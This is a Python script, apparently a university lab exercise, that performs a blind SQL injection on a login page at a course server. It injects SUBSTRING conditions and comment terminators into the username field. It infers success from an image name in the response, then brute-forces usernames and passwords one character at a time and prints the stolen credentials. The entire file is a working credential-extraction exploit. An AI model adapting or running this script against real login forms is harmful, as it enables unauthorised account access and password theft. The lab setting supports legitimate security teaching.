import requests
import string 
from treelib import Tree

#change these variables to search for longer usernames and password
maxUsernameLen = 12
maxPasswordLen = 32

chars = [c for c in string.printable if c not in string.ascii_uppercase]
chars.remove('-')
chars.remove('+')
chars.remove(' ')


def strToUrlForm(string):
    urlFormStr = string.replace(' ', '%20')
    urlFormStr.replace('=', '%3D')
    return urlFormStr


def loginRequest(usernameField, debug):
    '''Makes a login request and returns true if login succeeded'''
  
    req = 'http://ses01.cs.umu.se:8080/labsql/login.php?u=' + strToUrlForm(usernameField) + '&p=whatever'
    
    response = requests.get(req)
    respDict = response.__dict__

    content = respDict["_content"]

    if debug:           #print resulting SQL query of injection
        print('SELECT * FROM users WHERE username = "' + usernameField + '" AND password = "whatever"')

    return "cat.JPG" in str(content)   #successful login page has a cat.JPG


def validSubstringOfUsername(string):
    '''Returns true if given string is substring of a username-record with given username and password lengths'''
    un = 'whatever"' + ' OR SUBSTRING(username, 1, ' + str(len(string)) + ') = "' + string + '" -- '
    return loginRequest(usernameField= un, debug= False)


def validUsername(username):
    un = username + '" -- '
    return loginRequest(usernameField= un, debug= False)


def crackPassword(username):
    '''Cracks the password for given username'''
    passw = ""
    for charSpot in range(maxPasswordLen):  
        for char in chars: 
            prospect = passw + char
            un = username + '" AND SUBSTRING(password, 1, ' + str(len(prospect)) + ') = "' + prospect + '" -- '

            if loginRequest(usernameField= un, debug= False):
                passw = prospect
                break
            
            if char == chars[-1]:
                return passw

    return passw


#tree in which each leaf is a matched substring of a username
matchesTree = Tree()                                        
matchesTree.create_node(data= "", tag="(root)")
stopSign = "(STOP)"

for charSpot in range(maxUsernameLen):
    
    #continue search from every matched username substring
    matchedUsernameLeaves = [leaf for leaf in matchesTree.leaves() if not leaf.data == stopSign]
    for leaf in matchedUsernameLeaves:
        matchedUsername = leaf.data
        matchFound = False    
        for char in chars:
            prospect = matchedUsername + char
            if validSubstringOfUsername(string= prospect):
                matchesTree.create_node(data= prospect, parent= leaf, tag= prospect)
                matchFound = True

        #check if search should not be expanded from leaf    
        if not matchFound and char == chars[-1]:
            matchesTree.create_node(data= stopSign, parent= leaf, tag= stopSign)

        if validUsername(matchedUsername):
            password = crackPassword(username= matchedUsername)
            print(matchedUsername, password)
            
    matchesTree.show()
